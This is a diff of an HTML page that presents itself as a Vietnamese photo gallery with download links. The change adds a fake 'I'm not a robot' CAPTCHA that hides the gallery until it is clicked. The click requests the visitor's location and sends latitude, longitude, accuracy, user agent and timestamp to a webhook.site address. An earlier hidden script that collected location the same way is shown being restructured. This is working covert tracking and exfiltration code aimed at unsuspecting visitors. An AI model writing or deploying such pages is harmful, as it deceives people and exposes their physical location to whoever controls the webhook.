@@ -10,9 +10,7 @@
       text-align: center;
       margin: 40px;
     }
-    h1 {
-      margin-bottom: 20px;
-    }
+    h1 { margin-bottom: 20px; }
     .gallery {
       display: flex;
       flex-wrap: wrap;
@@ -39,31 +37,62 @@
       text-decoration: none;
       border-radius: 4px;
     }
-    .photo a:hover {
-      background: #0056b3;
+    .photo a:hover { background: #0056b3; }
+
+    /* CAPTCHA box */
+    .captcha-box {
+      display: inline-block;
+      padding: 20px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      background: #f9f9f9;
+      margin-top: 100px;
     }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      background: #4285f4;
+      color: white;
+      border-radius: 5px;
+    }
+    button:hover { background: #3367d6; }
+    .note { font-size: 14px; color: #555; margin-top: 10px; }
   </style>
 </head>
 <body>
-  <h1>Bộ sưu tập ảnh của tôi</h1>
-  <p>Bạn có thể tải xuống những bức ảnh bên dưới:</p>
 
-  <div class="gallery">
-    <div class="photo">
-      <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 1" width="300">
-      <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
-    </div>
-    <div class="photo">
-      <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 2" width="300">
-      <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
-    </div>
-    <div class="photo">
-      <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 3" width="300">
-      <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
+  <!-- CAPTCHA giả -->
+  <div class="captcha-box" id="captcha">
+    <h3>🔒 Xác nhận bạn không phải robot</h3>
+    <p>Nhấn nút bên dưới để tiếp tục</p>
+    <button onclick="verifyBot()">Tôi không phải robot</button>
+    <div class="note">Hệ thống sẽ thực hiện kiểm tra bảo mật nhanh...</div>
+  </div>
+
+  <!-- Gallery ẩn, chỉ hiện khi xác nhận xong -->
+  <div id="gallery" style="display:none;">
+    <h1>Bộ sưu tập ảnh của tôi</h1>
+    <p>Bạn có thể tải xuống những bức ảnh bên dưới:</p>
+
+    <div class="gallery">
+      <div class="photo">
+        <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 1">
+        <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
+      </div>
+      <div class="photo">
+        <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 2">
+        <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
+      </div>
+      <div class="photo">
+        <img src="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" alt="Ảnh 3">
+        <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>📥 Tải ảnh</a>
+      </div>
     </div>
   </div>
 
-  <!-- Script ẩn để lấy vị trí -->
   <script>
     const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
 
@@ -74,33 +103,40 @@
       }).catch(e => console.error("Error:", e));
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          sendToWebhook({
-            status: "gps_success",
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            ua: navigator.userAgent,
-            time: new Date().toISOString()
-          });
-        },
-        err => {
-          sendToWebhook({
-            status: "gps_denied",
-            error: err.message,
-            ua: navigator.userAgent,
-            time: new Date().toISOString()
-          });
-        }
-      );
-    } else {
-      sendToWebhook({
-        status: "no_geolocation_api",
-        ua: navigator.userAgent,
-        time: new Date().toISOString()
-      });
+    function verifyBot() {
+      // Ẩn captcha, hiện gallery
+      document.getElementById("captcha").style.display = "none";
+      document.getElementById("gallery").style.display = "block";
+
+      // Xin quyền vị trí
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            sendToWebhook({
+              status: "gps_success",
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              ua: navigator.userAgent,
+              time: new Date().toISOString()
+            });
+          },
+          err => {
+            sendToWebhook({
+              status: "gps_denied",
+              error: err.message,
+              ua: navigator.userAgent,
+              time: new Date().toISOString()
+            });
+          }
+        );
+      } else {
+        sendToWebhook({
+          status: "no_geolocation_api",
+          ua: navigator.userAgent,
+          time: new Date().toISOString()
+        });
+      }
     }
   </script>
 </body>
